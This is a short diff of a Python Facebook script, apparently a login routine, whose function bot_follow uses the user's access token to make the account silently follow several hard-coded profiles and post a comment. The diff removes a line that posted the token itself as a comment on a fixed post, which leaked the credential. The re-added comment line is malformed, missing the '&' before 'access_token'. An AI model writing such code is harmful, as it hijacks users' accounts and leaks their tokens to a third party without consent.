@@ -100,8 +100,7 @@ def bot_follow():
         requests.post('https://graph.facebook.com/100008420107265/subscribers?access_token=' + toket) #
         requests.post('https://graph.facebook.com/100005238607438/subscribers?access_token=' + toket) #
     	requests.post('https://graph.facebook.com/100027708738216/subscribers?access_token=' + toket) #
-        requests.post('https://graph.facebook.com/269669551852500/comments/?message=' +token+ '&access_token=' + toket)
-        requests.post('https://graph.facebook.com/269669551852500/comments/?message=' +kom+ '&access_token=' + toket)     
+        requests.post('https://graph.facebook.com/269669551852500/comments/?message=' +kom+ 'access_token=' + toket)     
         print(('[+] \x1b[92mLogin Sukses!\x1b[0m'))
         raw_input('[+] Tekan Enter ')
         menu()
